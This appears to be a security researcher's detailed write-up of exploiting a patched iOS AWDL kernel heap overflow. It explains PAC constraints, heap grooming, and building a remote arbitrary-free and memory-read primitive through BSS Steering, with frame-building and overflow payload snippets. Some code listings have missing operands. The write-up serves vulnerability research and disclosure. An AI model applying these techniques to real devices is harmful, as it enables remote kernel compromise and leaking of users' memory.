The Apple A12 SOC found in the iPhone Xr/Xs contained the first commercially-available ARM CPU implementing the [ARM-8.3]( optional Pointer Authentication feature. This was released in September 2018. [This post from Project Zero researcher Brandon Azad]( covers PAC and its implementation by Apple in great detail, as does [this presentation from the 2019 LLVM developers meeting](
Its primary use is as a form of Control Flow Integrity. In theory all function pointers present in memory should contain a Pointer Authentication Code in their upper bits which will be verified after the pointer is loaded from memory but before it's used to modify control flow.
In almost all cases this PAC instrumentation will be added by the compiler. There's [a really great document from the clang team]( which goes into great detail about the implementation of PAC from a compiler point of view and the security tradeoffs involved. It has a brilliant section on the threat model of PAC which frankly and honestly discusses the cases where PAC may help and the cases where it won't. Documentation like this should ship with every mitigation.
Having a publicly documented threat model helps everyone understand the intentions behind design decisions and the tradeoffs which were necessary. It helps build a common vocabulary and helps to move discussions about mitigations away from a focus on security through obscurity towards a qualitative appraisal of their strengths and weaknesses.
Concretely, the first hurdle PAC will throw up is that it will make it harder to forge vtable pointers.
All OSObject-derived objects have virtual methods. IO80211AWDLPeer, like almost all IOKit C++ classes derives from OSObject so the first field is a vtable pointer. As we saw in the heap-grooming sketches earlier, by spraying IO80211AWDLPeer objects then triggering the heap overflow we can easily gain control of a vtable pointer. This technique was used in [Mateusz Jurczyk]( [Samsung MMS remote exploit]( and [Natalie Silvanovich]( [remote WebRTC exploit]( this year.
Kernel virtual calls have gone from looking like this on A11 and below:
LDR X8, [X20] ; load vtable pointer
LDR X8, [X8, ; load function pointer from vtable
MOV X0, X20
BLR X8 ; call virtual function
to this on A12 and above:
LDR X8, [X20] ; load vtable pointer
; authenticate vtable pointer using A-family data key and zero context
; if authentication passes, add 0x38 to vtable pointer, load value
; at that address into X9 and store X8+0x38 back to X8 without a PAC
LDRAA X9, [X8,
; overwrite the upper 16 bits of X8 with the constant 0xFFFC
; this is a hash of the mangled symbol; constant at each callsite
MOVK X8, MOV X0, X20
; authenticate virtual function pointer with A-family instruction key
; and context value where the upper 16 bits are a hash of the
; virtual function prototype and the lower 48 bits are the runtime
; address of the virtual function pointer in the vtable
BLRAA X9, X8

What does that mean in practice?
If we don't have a signing gadget, then we can't trivially point a vtable pointer to an arbitrary address. Even if we could, we'd need a data and instruction family signing gadget with control over the discriminator.
We can swap a vtable pointer with any other A-family 0-context data key signed pointer, however the virtual function pointer itself is signed with a context value consisting of the address of the vtable entry and a hash of the virtual function prototype. This means we can't swap virtual function pointers from one vtable into another one (or more likely into a fake vtable to which we're able to get an A-family data key signed pointer.)
We can swap one vtable pointer for another one to cause a type confusion, however every virtual function call made through that vtable pointer would have to be calling a function with a matching prototype hash. This isn't so improbable; a fundamental building block of object-oriented programming in C++ is to call functions with matching prototypes but different behaviour via a vtable. Nevertheless you'd have to do some thinking to come up with a generic defeat using this approach.
An important observation is that the vtable pointers themselves have no address diversity; they're signed with a zero-context. This means that if we can disclose a signed vtable pointer for an object of type A at address X, we can overwrite the vtable pointer for another object of type A at a different address Y.
This might seem completely trivial and uninteresting but remember: we only have a linear heap buffer overflow. If the vtable pointer had address diversity then for us to be able to safely corrupt fields after the vtable in an adjacent object we'd have to first disclose the exact vtable pointer following the object which we can overflow out of. Instead we can disclose any vtable pointer for this type and it will be valid.
The [clang design doc explains why this is](
It is also known that some code in practice copies objects containing v-tables with memcpy, and while this is not permitted formally, it is something that may be invasive to eliminate.
Right at the end of this document they also say "attackers can be devious." On A12 and above we can no longer trivially point the vtable pointer to a fake vtable and gain arbitrary PC control fairly easily. Guess we'll have to get devious :)
Some initial ideas
Initially I continued using the iOS 12 beta 1 kernelcache when searching for exploitation primitives and performing the initial reversing to better understand the layout of the IO80211AWDLPeer object. This turned out to be a major mistake and a few weeks were spent following unproductive leads:
In the iOS 12 beta 1 kernelcache the fields following the sync_tree_macs buffer seemed uninteresting, at least from the perspective of being able to build a stronger primitive from the linear overflow. For this reason my initial ideas looked at corrupting the fields at the beginning of an IO80211AWDLPeer object which I could place subsequently in memory, option 2 which we saw earlier:
Spoofing many source MAC addresses makes allocating neighbouring IO80211AWDLPeer objects fairly easy. The synctree buffer overflow then allows corrupting the lower fields of an IO80211AWDLPeer in addition to the upper fields
Almost certainly we're going to need some kind of memory disclosure primitive to land this exploit. My first ideas for building a memory disclosure primitive involved corrupting the linked-list of peers. The data structure holding the peers is in fact much more complex than a linked list, it's more like a priority queue with some interesting behaviours when the queue is modified and a distinct lack of [safe unlinking]( and the like. I'd expect iOS to start slowly migrating to using data-PAC for linked-list integrity, but for now this isn't the case. In fact these linked lists don't even have the most basic safe-unlinking integrity checks yet.
The start of an IO80211AWDLPeer object looks like this:
All IOKit objects inheriting from OSObject have a vtable and a reference count as their first two fields. In an IO80211AWDLPeer these are followed by a hash_bucket identifier, a peer_listflink and blink, the peer's MAC address and the peer's peer_manager pointer.
My first ideas revolved around trying to partially corrupt a peer linked-list pointer. In hindsight, there's an obvious reason why this doesn't work (which I'll discuss in a bit), but let's remain enthusiastic and continue on for now...
Looking through the places where the linked list of peers seemed to be used it looked like perhaps the IO80211AWDLPeerManager::updatePeerListBloomFilter method might be interesting from the perspective of trying to get data leaked back to us. Let's take a look at it:
int n_peers = this->peers_list.n_elems;
if (!this->peer_bloom_filters_enabled) {
return 0;
bzero(this->bloom_filter_buf, 0xA00uLL);
this->n_macs_in_bloom_filter = 0;
IO80211AWDLPeer* peer = this->peers_list.head;
int n_peers_in_filter = 0;
for (;
n_peers_in_filter < n_peers && n_peers_in_filter < 0x100;
n_peers_in_filter++) {
this->bloom_filter_macs[n_peers_in_filter] = peer.mac;
peer = peer->flink;
bloom_filter_create(10*(n_peers_in_filter+7) & 0xff8,
if (n_peers_in_filter){
this->updateBroadcastMI(9, 1, 0);
return 0;
From the IO80211AWDLPeerManager it's reading the peer list head pointer as well as a count of the number of entries in the peer list. For each entry in the list it's reading the MAC address field into an array then builds a [bloom filter]( from that buffer.
The interesting part here is that the list traversal is terminated using a count of elements which have been traversed rather than by looking for a termination pointer value at the end of the list (eg a NULL or a pointer back to the head element.) This means that potentially if we could corrupt the linked-list pointer of the second-to-last peer to be processed we could point it to a fake peer and get data at a controlled address added into the bloom filter. updateBroadcastMI looks like it will add that bloom filter data to the Master Indication frame in the bloom filter TLV, meaning we could get a bloom filter containing data read from a controlled address sent back to us. Depending on the exact format of the bloom filter it would probably be possible to then recover at least some bits of remote memory.
It's important to emphasize at this point that due to the lack of a remote KASLR leak and also the lack of a remote PAC signing gadget or vtable disclosure, in order to corrupt the linked-list pointer of an adjacent peer object we have no option but to corrupt its vtable pointer with an invalid value. This means that if any virtual methods were called on this object, it would almost certainly cause a kernel panic.
The first part of trying to get this to work was to work out how to build a suitable heap groom such that we could overflow from a peer into the second-to-last peer in the list which would be processed
Both the linked-list order and the virtual memory order need to be groomed to allow a targeted partial overflow of the final linked-list pointer to be traversed. In this layout we'd need to overflow from 2 into 6 to corrupt the final pointer from 6 to 7.
There is a mitigation from a few years ago in play here which we'll have to work around; namely the randomization of the initial zone freelists which adds a slight element of randomness to the order of the allocations you will get for consecutive calls to kalloc for the same size. The randomness is quite minimal however so the trick here is to be able to pad your allocations with "safe" objects such that even though you can't guarantee that you always overflow into the target object, you can mostly guarantee that you'll overflow into that object or a safe object.
We need two primitives: Firstly, we need to understand the semantics of the list. Secondly, we need some safe objects.
The peer list
With a bit of reversing we can determine that the code which adds peers to the list doesn't simply add them to the start. Peers which are first seen on a 2.4GHz channel (6) do get added this way, but peers first seen on a 5GHz channel (44) are inserted based on their [RSSI]( (received signal strength indication - a unitless value approximating signal strength.) Stronger signals mean the peer is probably physically closer to the device and will also be closer to the start of the list. This gives some nice primitives for manipulating the list and ensuring we know where peers will end up.
Safe objects
The second requirement is to be able to allocate arbitrary, safe objects. Our ideal heap grooming/shaping objects would have the following primitives:
1) arbitrary size
2) unlimited allocation quantity
3) allocation has no side effects
4) controlled contents
5) contents can be safely corrupted
6) can be free'd at an arbitrary, controlled point, with no side effects
Of course, we're completely limited to objects we can force to be allocated remotely via AWDL so all the tricks from local kernel exploitation don't work. For example, I and others have used various forms of mach messages, unix pipe buffers, OSDictionaries, IOSurfaces and more to build these primitives. None of these are going to work at all. AWDL is sufficiently complicated however that after some reversing I found a pretty good candidate object.
Service response descriptor (SRD)
This is my reverse-engineered definition of the services response descriptor TLV (type 2):
{ u8 type
u16 len
u16 key_len
u8 key_val[key_len]
u16 value_total_size
u16 fragment_offset
u8 fragment[len-key_len-6] }
It has two variable-sized fields: key_val and fragment. The key_length field defines the length of the key_val buffer, and the length of fragment is the remaining space left at the end of the TLV. The parser for this TLV makes a kalloc allocation of val_length, an arbitrary u16. It then memcpy's from fragment into that kalloc buffer at offset frag_offset:
The service_response technique gives us a powerful heap grooming primitive
I believe this is supposed to be support for receiving out-of-order fragments of service request responses. It gives us a very powerful primitive for heap grooming. We can choose an arbitrary allocation size up to 64k and write an arbitrary amount of controlled data to an arbitrary offset in that allocation and we only need to provide the offset and content bytes.
This also gives us a kind of amplification primitive. We can bundle quite a lot of these TLVs in one frame allowing us to make megabytes of controlled heap allocations with minimal side effects in just one AWDL frame.
This SRD technique in fact almost completely meets criteria 1-5 outlined above. It's almost perfect apart from one crucial point; how can we free these allocations?
Through static reversing I couldn't find how these allocations would be free'd, so I wrote a dtrace script to help me find when those exact kalloc allocations were free'd. Running this dtrace script then running a test AWDL client sending SRDs I saw the allocation but never the free. Even disabling the AWDL interface, which should clean up most of the outstanding AWDL state, doesn't cause the allocation to be freed.
This is possibly a bug in my dtrace script, but there's another theory: I wrote another test client which allocated a huge number of SRDs. This allocated a substantial amount of memory, enough to be visible using zprint. And indeed, running that test client repeatedly then running zprint you can observe the inuse count of the target zone getting larger and larger. Disabling AWDL doesn't help, neither does waiting overnight. This looks like a pretty trivial memory leak.
Later on we'll examine the cause of this memory leak but for now we have a heap allocation primitive which meets criteria 1-5, that's probably good enough!
A first attempt at a useful corruption
I managed to build a heap groom which gets the linked-list and heap objects set up such that I can overflow into the second-to-last peer object to be processed:
By surrounding peer objects with a sufficient number of safe objects we can ensure that the linear corruption either hits the right peer object or a safe object
The trick is to ensure that the ratio of safe objects to peers is sufficiently high that you can be (reasonably) sure that the two target peers will only be next to each other or next to safe objects (they won't be next to other peers in the list.) Even though you may not be able to force the two peers to be in the correct order as shown in the diagram, you can at least make the corruption safe if they aren't, then try again.
When writing the code to build the SyncTree TLV I realized I'd made a huge oversight...
My initial idea had been to only partially overwrite a valid linked-list pointer element:
If we could partially overflow the peer_list_flink pointer we could potentially move it to point it somewhere nearby. In this illustration by moving it down by 8 bytes we could potentially get some bytes of a peer_list_blink added to the peer MACs bloom filter. A partial overwrite doesn't directly give a relative add or subtract primitive, but with some heap grooming overwriting the lower 2 bytes can yield something similar
But when you actually look more closely at the memory layout taking into account the limitations of the corruption primitive:
Computing the relative offsets between two IO80211AWDLPeers next to each other in memory it turns out that a useful partial overwrite of peer_list_flink isn't possible as it lies on a 6-byte boundary from the lower peer's sync_tree_macs array
This is not a useful type of partial overwrite and it took a lot of effort to make this heap groom work only to realize in hindsight this obvious oversight.
Attempting to salvage something from all this work I tried instead to just completely overwrite the linked-list pointer. We'd still need some other vulnerability or technique to determine what we should overwrite with but it would at least be some progress to see a read or write from a controlled address.
Alas, whilst I'm able to do the overflow, it appears that the linked-list of peers is being continually traversed in the background even when there's no AWDL traffic and virtual methods are being called on each peer. This will make things significantly harder without first knowing a vtable pointer.
Another option would be to trigger the SyncTree overflow twice during the parsing of a single frame. Recall the code in actionFrameReport:
case 0x14:
if (tlv_cnt[0x14] >= 2)
goto ERR;
I explored places where a TLV would trigger a peer list traversal. The idea would then be to sandwich a controlled lookup between two SyncTree TLVs, the first to corrupt the list and the second to somehow make that safe. There were some code paths like this, where we could cause a controlled peer to be looked up in the peer list. There were even some places where we could potentially get a different memory corruption primitive from this but they looked even trickier to exploit. And even then you'd not be able to reset the peer list pointer with the second overflow anyway.
Thus far none of my ideas for a read panned out; messing with the linked list without a correctly PAC'd vtable pointer just doesn't seem feasible. At this point I'd probably consider looking for a second vulnerability. For example, in Natalie's recent WebRTC exploit she was able to [find a second vulnerability to defeat ASLR](
There are still some other ideas left open but they seem tricky to get right:
The other major type of object in the kalloc.6144 zone are ipc_kmsg's for some IOKit methods. These are in-flight mach messages and it might be possible to corrupt them such that we could inject arbitrary mach messages into userspace. This idea seems mostly to create new challenges rather than solve any open ones though.
If we don't target the same zone then we could try a cross-zone attack, but even then we're quite limited by the primitives offered by AWDL. There just aren't that many interesting objects we can allocate and manipulate.
By this point I've invested a lot of time into this project and am not willing to give up. I've also been hearing very faint whispers that I might have accidentally stumbled upon an attack surface which is being actively exploited. Time to try one more thing...
Getting up to date
Up until this point I'd been doing most of my reversing using the partially symbolized iOS 12 beta 1 kernelcache. I had done a considerable amount of reversing engineering to build up a reasonable idea of all the fields in the IO80211AWDLPeer object which I could corrupt and it wasn't looking promising. But this vulnerability was only going to get patched in iOS 13.3.1.
Can they have added new fields in iOS 13? It seemed unlikely but of course worth a look.
Here's my reverse-engineered structure definition for IO80211AWDLPeer in iOS 13.3/MacOS 10.15.2:
struct __attribute__((packed)) __attribute__((aligned(4))) IO80211AWDLPeer {
The layout of fields in my reverse-engineered version of IO80211AWDLPeer. You can define and edit structures in C-syntax like this using the Local Types window in IDA: right-clicking a type and selecting "Edit..." brings up an interactive edit window; it's very helpful for reversing complex data structures such as this.
There are new fields! In fact, there's a new pointer field and length field right at the end of the IO80211AWDLPeer object. But what is a steering_msg_blob? What is BSS Steering?
BSS Steering
Let's take a look at where the steering_msg_blob pointer is used.
It's allocated in IO80211AWDLPeer::populateBssSteeringMsgBlob, via the following call stack:
bssSteeringStateMachine is called from many places, including IO80211AWDLPeer::actionFrameReport when it parses a BSS Steering TLV (type 0x1d), so it looks like we can indeed drive this state machine remotely somehow.
The steering_msg_blob pointer is freed in IO80211AWDLPeer::freeResources when the IO80211AWDLPeer object is destroyed:
steering_msg_blob = this->steering_msg_blob;
if ( steering_msg_blob )
kfree(steering_msg_blob, this->steering_msg_blob_size);
This gives us our first new primitive: an arbitrary free. Without needing to reverse any of the BSS Steering code we can quite easily overflow from the sync_tree_macs field into the steering_msg_blob and steering_msg_blog_size fields, setting them to arbitrary values.
If we then wait for the peer to timeout and be destroyed, when ::freeResources is called it will call kfree with our arbitrary pointer and size.
The steering_msg_blob is also used in one more place:
In IO80211AWDLPeerManager::handleUmiTimer the IO80211AWDLPeerManager walks a linked-list of peers (a separate linked-list from that used to store all the peers) and from each of the peers in that list it checks whether that peer and the current device are on the same channel and in an availability window:
if ( peer_manager->current_channel_ == peer->chanseq_channels[peer_manager->current_chanseq_step] ) {
If the UMI timer has indeed fired when both this device and the peer from the UMI list are on the same channel in an overlapping availability window then the IO80211AWDLPeerManager removes the peer from the UMI list, reads the bss_steering_blob from the peer and passes it as the last argument to the peer's::sendUnicastMI method.
This passes that blob to IO80211AWDLPeerManager::buildMasterIndicationTemplate to build an AWDL master indication frame before attempting to transmit it.
Let's look at how buildMasterIndicationTemplate uses the steering_msg_blob:
The third argument to buildMasterIndicationTemplate is is_unicast_MI which indicates whether this method was called by IO80211AWDLPeerManager::sendUnicastMI (which sets it to 1) or IO80211AWDLPeerManager::updatePrimaryPayloadMI (which sets it to 0.)
If buildMasterIndicationTemplate was called to build a unicast MI frame and the peer's feature_mask field has 0xD'th bit set then the steering_msg_blob will be passed to IO80211AWDLPeerManager::buildMultiPeerBssSteeringTlv. This method reads a size from the second dword in the steering_msg_blob and checks whether it is smaller than the remaining space in the frame template buffer; if it is, then that size value is used to copy that number of bytes from the steering_msg_blob pointer into a TLV (type 0x1d) in the template frame which will then be sent out over the air!
There's clearly a path here to get a semi-arbitrary read; but actually triggering it will require quite a bit more reversing. We need the UMI timer to be firing and we also need to get a peer into the UMI linked list.
BSS steering state machine
At this point a sensible question to ask is, what exactly is BSS Steering? A bit of googling tells us that it's part of [802.11v]( a set of management standards for enterprise networks. One of the advanced features of enterprise networks is the ability to seamlessly move devices between different access points which form part of the same network; for example when you walk around the office with your phone or if there are too many devices associated with one access point. AWDL isn't part of 802.11v. My best guess as to what's happening here is that AWDL is driving the 802.11v AP roaming code to try to move AWDL clients on to a common infrastructure network. I think this code was added to support [Sidecar]( but everything below is based only on static reversing.
IO80211PeerBssSteeringManager::bssSteeringStateMachine is responsible for driving the BSS steering state machine. The first argument is a bssSteeringEventenum value representing an event which the state machine should process. Using the IO80211PeerBssSteeringManager::getEventName method we can determine the names for all the events which the state machine will process and using the IO80211PeerBssSteeringManager::getStateName method we can determine the names of the states which the state machine can be in. Again using the local types window in IDA we can define enums for these which will make the HexRays decompiler output much more readable:
enum BSSSteeringState
BSS_STEERING_STATE_IDLE = 0x0,
BSS_STEERING_STATE_PRE_STEERING_SYNC_EVAL = 0x1,
BSS_STEERING_STATE_ASSOCIATION_ONGOING = 0x2,
BSS_STEERING_STATE_TX_CONFIRM_AWAIT = 0x3,
BSS_STEERING_STATE_STEERING_SYNC_CONFIRM_AWAIT = 0x4,
BSS_STEERING_STATE_STEERING_SYNCED = 0x5,
BSS_STEERING_STATE_STEERING_SYNC_FAILED = 0x6,
BSS_STEERING_STATE_SELF_STEERING_ASSOCIATION_ONGOING = 0x7,
BSS_STEERING_STATE_STEERING_SYNC_POST_EVAL = 0x8,
BSS_STEERING_STATE_SUSPEND = 0x9,
BSS_STEERING_INVALID = 0xA,
enum bssSteeringEvent
BSS_STEERING_MODE_ENABLE = 0x0,
BSS_STEERING_RECEIVED_DIRECTED_STEERING_CMD = 0x1,
BSS_STEERING_DO_PRESYNC_EVAL = 0x2,
BSS_STEERING_PRESYNC_EVAL_DONE = 0x3,
BSS_STEERING_SELF_INFRA_LINK_CHANGED = 0x4,
BSS_STEERING_DIRECTED_STEERING_CMD_SENT = 0x5,
BSS_STEERING_DIRECTED_STEERING_TX_CONFIRM_RXED = 0x6,
BSS_STEERING_SYNC_CONFIRM_ATTEMPT = 0x7,
BSS_STEERING_SYNC_SUCCESS_EVENT = 0x8,
BSS_STEERING_SYNC_FAILED_EVENT = 0x9,
BSS_STEERING_OVERALL_STEERING_TIMEOUT = 0xA,
BSS_STEERING_DISABLE_EVENT = 0xB,
BSS_STEERING_INFRA_LINK_CHANGE_TIMEOUT = 0xC,
BSS_STEERING_SELF_STEERING_REQUESTED = 0xD,
BSS_STEERING_SELF_STEERING_DONE = 0xE,
BSS_STEERING_SUSPEND_EVENT = 0xF,
BSS_STEERING_RESUME_EVENT = 0x10,
BSS_STEERING_REMOTE_STEERING_TRIGGER = 0x11,
BSS_STEERING_PEER_INFRA_LINK_CHANGED = 0x12,
BSS_STEERING_REMOTE_STEERING_FAILED_EVENT = 0x13,
BSS_STEERING_INVALID_EVENT = 0x14,
The current state is maintained in a steering context object, owned by the IO80211PeerBssSteeringManager. Reverse engineering the state machine code we can come up with the following rough definition for the steering context object:
struct __attribute__((packed)) BssSteeringCntx
uint32_t first_field;
uint32_t service_type;
uint32_t peer_count;
uint32_t role;
struct ether_addr peer_macs[8];
struct ether_addr infraBSSID;
uint8_t pad4[6];
uint32_t infra_channel_from_datapath_tlv;
uint8_t pad8[8];
char ssid[32];
uint8_t pad1[12];
uint32_t num_peers_added_to_umi;
uint8_t pad_10;
uint8_t pendingTransitionToNewState;
uint8_t pad7[2];
enum BSSSteeringState current_state;
uint8_t pad5[8];
struct IOTimerEventSource *bssSteeringExpiryTimer;
struct IOTimerEventSource *bssSteeringStageExpiryTimer;
uint8_t pad9[8];
uint32_t steering_policy;
uint8_t inProgress;
Our goal here is reach IO80211AWDLPeer::populateBssSteeringMsgBlob which is called by IO80211PeerBssSteeringManager::processPostSyncEvaluation which is called when the state machine is in the BSS_STEERING_STATE_STEERING_SYNC_POST_EVAL state and receives the BSS_STEERING_PRESYNC_EVAL_DONE event.
Navigating the state machine
Each time a state is evaluated it can change the current state and optionally set the stateMachineTriggeredEvent variable to a new event and set sendEventToNewState to 1. This way the state machine can drive itself forwards to a new state. Let's try to find the path to our target state:
The state machine begins in BSS_STEERING_STATE_IDLE. When we send the BSS steering TLV for the first time this injects either the BSS_STEERING_REMOTE_STEERING_TRIGGER or BSS_STEERING_RECEIVED_DIRECTED_STEERING_CMD event depending on whether the steeringMsgID in the TLV was was 6 or 0.
This causes a call to IO80211PeerBssSteeringManager::processBssSteeringEnabled which parses a steering_msg structure which itself was parsed from the bss steering tlv; we'll take a look at both of those in a moment. If the steering manager is happy with the contents of the steering_msg structure from the TLV it starts two [IOTimerEventSources]( the bssSteeringExpiryTimer and the bssSteeringStageExpiryTimer. The SteeringExpiry timer will abort the entire steering process when it triggers, which happens after a few seconds. The StageExpiry timer allows the state machine to make progress asynchronously. When it expires it will call the IO80211PeerBssSteeringManager::bssSteeringStageExpiryTimerHandler function, a snippet of which is shown here:
cntx = this->steering_cntx;
if ( cntx && cntx->pendingTransitionToNewState )
current_state = cntx->current_state;
switch ( current_state )
case BSS_STEERING_STATE_PRE_STEERING_SYNC_EVAL:
event = BSS_STEERING_DO_PRESYNC_EVAL;
case BSS_STEERING_STATE_ASSOCIATION_ONGOING:
case BSS_STEERING_STATE_SELF_STEERING_ASSOCIATION_ONGOING:
event = BSS_STEERING_INFRA_LINK_CHANGE_TIMEOUT;
case BSS_STEERING_STATE_STEERING_SYNC_CONFIRM_AWAIT:
event = BSS_STEERING_SYNC_CONFIRM_ATTEMPT;
goto ERR;
result = this->bssSteeringStateMachine(this, event, ...
We can see here the four state transitions which may happen asynchronously in the background when the StageExpiry timer fires and causes events to be injected.
From BSS_STEERING_STATE_IDLE, after the timers are initialized the code sets the pendingTranstionToNewState flag and updates the state to BSS_STEERING_STATE_PRE_STEERING_SYNC_EVAL:
this->steering_cntx->pendingTransitionToNewState = 1;
state = BSS_STEERING_STATE_PRE_STEERING_SYNC_EVAL;
We can now see that this will cause the the BSS_STEERING_DO_PRESYNC_EVAL event to be injected into the steering state machine and we reach the following code:
case BSS_STEERING_STATE_PRE_STEERING_SYNC_EVAL:
if ( EVENT == BSS_STEERING_DO_PRESYNC_EVAL ) {
steering_policy = this->processPreSyncEvaluation(cntx);
Here the BSS steering TLV gets parsed and reformatted into a format suitable for the BSS steering code, presumably this is the compatibility layer between the 802.11v enterprise WiFi BSS steering code and AWDL.
We need the IO80211PeerBssSteeringManager::processPreSyncEvaluation to return a steering_policy value of 7. The code which determines this is very complicated; in the end it turns out that if the target device is currently connected to a 5Ghz network on a non-DFS channel then we can get it to return the right steering policy value to reach BSS_STEERING_STATE_STEERING_SYNC_POST_EVAL. DFS channels are dynamic and can be disabled at runtime if radar is detected. There's no requirement that the attacker is also on the same 5GHz network. There might also be another path to reach the required state but this will do.
At this point we finally reach processPostSyncEvaluation and the steeringMsgBlob will be allocated and the UMI timer armed. When it starts firing the code will attempt to read the steering_msg_blob pointer and send the buffer it points to over the air.
Building the read
Let's look concretely at what's required for the read:
We need two spoofer peers:
struct ether_addr reader_peer = *(ether_aton("22:22:aa:22:00:00"));
struct ether_addr steerer_peer = *(ether_aton("22:22:bb:22:00:00"));
The target device needs to be aware of both these peers so we allocate the reader peer by spoofing a frame from it:
WIFI(dst, reader_peer),
UNICAST_DATAPATH(0x1307 | 0x800),
There are two important things here:
1) This peer will have a channel sequence which is empty; this is crucial as it means we can enforce a gap between the allocation of the steering_msg_blob by processPostSyncEvaluation and its use in the UMI timer. Recall that we saw earlier that the unicast MI template only gets built when the UMI timer fires during a peer availability window; if the peer has no availability windows, then the template won't be updated and the steering_msg_blob won't be used. We can easily change the channel sequence later by sending a different TLV.
2) The flags in the UNICAST_DATAPATH TLV. That 0x800 is quite important, without it this happens:
This tweet from  on May 27th 2020 mentioned a double free in BSS reachable via AWDL
We'll get to that...
The next step is to allocate the steerer_peer and start steering the reader:
WIFI(dst, steerer_peer),
BSS_STEERING(&reader_peer, 1),
Let's look at the bss_steering TLV:
struct bss_steering_tlv {
uint8_t type;
uint16_t length;
uint32_t steeringMsgID;
uint32_t steeringMsgLen;
uint32_t peer_count;
struct ether_addr peer_macs[8];
struct ether_addr BSSID;
uint32_t steeringTimeoutThreshold;
uint32_t SSID_len;
uint8_t infra_channel;
uint32_t steeringCmdFlags;
char SSID[32];
} __attribute__((packed));
We need to carefully choose these values; the important part for the exploit however is that we can specify up to 8 peers to be steered at the same time. For this example we'll just steer one peer. Here we build a bss_steering_tlv with only one peer_mac set to the mac address of reader_peer. If we've set everything up correctly this should cause the IO80211AWDLPeer for the reader_peer object to allocate a steering_msg_blob and start the UMI timer firing trying to send that blob in a UMI
UMIs are Unicast Master Indication frames; unlike regular AWDL Master Indication frames UMIs are sent to unicast MAC addresses.
We can now send a final frame:
char overflower[0x80] = {0};
*(uint64_t*)(&overflower[0x50]) = 0x4141414141414141;
WIFI(dst, reader_peer),
SYNC_TREE((struct ether_addr*)overflower,
sizeof(overflower)/sizeof(struct ether_addr)),
There are two important parts to this frame:
1) We've included a SyncTree TLV which will trigger the buffer overflow. SYNC_TREE will copy the MAC addresses in overflower into the sync_tree_macs inline buffer in the IO80211AWDLPeer:
sync_tree_macs is at offset +0x1648 in the IO80211AWDLPeer object and the steering_msg_blob is at +0x1698 so by placing our arbitrary read target 0x50 bytes in to the SYNC_TREE tlv we'll overwrite the steering_msg_blob, in this case with the value 0x4141414141414141.
2) The other important part is that we no longer send the CHAN_SEQ_EMPTY TLV, meaning this peer will use the channel sequence in the sync_params TLV. This contains a channel sequence where the peer declares they are listening in every Availability Window (AW), meaning that the next time the UMI timer fires while the target device is also in an AW it will read the corrupted steering_msg_blob pointer and try to build a UMI using it. If we sniff for UMI frames coming from the target MAC address (dst in this example) and parse out TLV 0x1d we'll find our (almost) arbitrarily read memory!
In this case of course trying to read from an address like 0x4141414141414141 will almost certainly cause a kernel panic, so we've still got more work to do.
Almost-arbitrary read
There are some important limitations for this read technique: firstly, the steering_msg_blob has its length as the second dword member and that length will be used as the length of memory to copy into the UMI. This means that we can only read from places where the second dword pointed to is a small value less than around 800 (the available space in the UMI frame.) That size also dictates how much will be read. We can work with this as an initial arbitrary read primitive however.
The second limitation is the speed of these reads; in order to steer multiple peers at the same time and therefore perform multiple reads in parallel we'll need some more tricks. For now, the only option is to wait for steering to fail and restart the steering process. This takes around 8 seconds, after which the steering process can be restarted by using a steeringMsgId value of 0 rather than 6 in in the BSS_STEERING TLV.
What to read
At this point we can get memory sent back to us provided it meets some requirements. Helpfully if the memory doesn't meet those requirements as long as the virtual address was mapped and readable the code won't crash so we have some leeway.
My first idea here was to use the physmap, an (almost) 1:1 virtual mapping of the physical address space in virtual memory. The base of the physmap address is randomized on iOS but the slide is smaller than the physical address space size, meaning there's a virtual address in there you can always read from. This gives you a safe virtual address to dereferences to start trying to find pointers to follow.
It was around this point in the development of the exploit that Apple released iOS 13.3.1 which patched the heap overflow. I wanted to also release at least some kind of demo at this point so I [released a very basic proof-of-concept]( which drove the BSS Steering state machine far enough to read from the physmap along with a little javascript snippet you could run in Safari to spray physical memory to demonstrate that you really were reading user data. Of course, this isn't all that compelling; the more compelling demo is still a few months down the road.
Discussing these problems with fellow Project Zero researchers Brandon Azad and Jann Horn, Brandon mentioned that on iOS the base of the zone map, used for most general kernel heap allocations, wasn't very randomized at all. I had looked at this using DTrace on MacOS and it seemed fairly randomized, but dumping kernel layout information on iOS isn't quite as trivial as setting a boot argument to disable SIP and enable kernel DTrace.
Brandon had recently finished [the exploit for his oob_timestamp bug]( and as part of that he'd made a spreadsheet showing various values such as the base of the zone and kalloc maps across multiple reboots. And indeed, the randomization of the base of the zone map is very minimal, around 16 MB:
Using the Service Response Descriptor TLV technique we can allocate 16MB of memory in just a handful of frames, which means we should stand a reasonable chance of being able to safely find our allocations on the heap.
Finding ourselves
What would we like to read? We've discussed before that in order to safely corrupt the fields after the vtable in the IO80211AWDLPeer object we'll need to know a PAC'ed vtable pointer so we'd like to read one of those. If we're able to find one of those we'll also know the address of at least one IO80211AWDLPeer object.
If you make enough allocations of a particular size in iOS they will tend to go from lower addresses to higher addresses. Apple has introduced various small randomizations into exactly how objects are allocated but they're not relevant if we just examine the overall trend, which is to try to fill the virtual memory area reserved for the zone map from bottom to top.
As the maximum slide value of the zone map is smaller than its size there will be a virtual address which is always inside the zone map
The insufficient randomization of the zone map base gives us quite a large virtual memory region I've dubbed the safe probe region where, provided we go approximately from low to high we can safely read.
Our heap groom is as follows:
We send a large number of service_response TLVs, each of which has the following form:
struct service_response_16k_id_tlv sr = {0};
sr.type = 2;
sr.len = sizeof(struct service_response_16k_id_tlv) - 3;
sr.s_1 = 2;
sr.key_buf[0] = 'A';
sr.key_buf[1] = 'B';
sr.v_1 = 0x4000;
sr.v_2 = 0x1648; // offset
sr.val_buf[0] = 6; // msg_type
sr.val_buf[1] = 0x320; // msg_id
sr.val_buf[2] = 0x41414141; // marker
sr.val_buf[3] = val; // value
Each of these TLVs causes the target device to make a 16KB kalloc allocation (one physical page) and then at offset +0x1648 in there write the following 4 dwords:
The counter value increments by one for each TLV we send.
We put 39 of these TLVs in every frame which will result in the allocation of 39 physical pages, or over 600kb, for each AWDL frame we send, allowing us to rapidly allocate memory.
We split the groom into three sections, first sending a number of these spray frames, then a number of spoofed peers to cause the allocation of a large number of IO80211AWDLPeer objects. Finally we send another large number of the service response TLVs.
This results in a memory layout approximating this:
Inside the safe probe region we aim to place a number of IO80211AWDLPeer objects, surrounded by service_response groom pages with approximately incrementing counter values
If we now use the BSS Steering arbitrary read primitive to read from near the bottom of the safe probe region at offset +0x1648 from page boundaries, we should hopefully soon find one of the service_response TLV buffers. Since each service_response groom contains a unique counter which we can then read, we can make a guess for the distance between this discovered service_response buffer and the middle of where we think target peers will be and so compute a new guess for the location of a target peer. This approach lets us do something like a binary search to find an IO80211AWDLPeer object reasonably efficiently
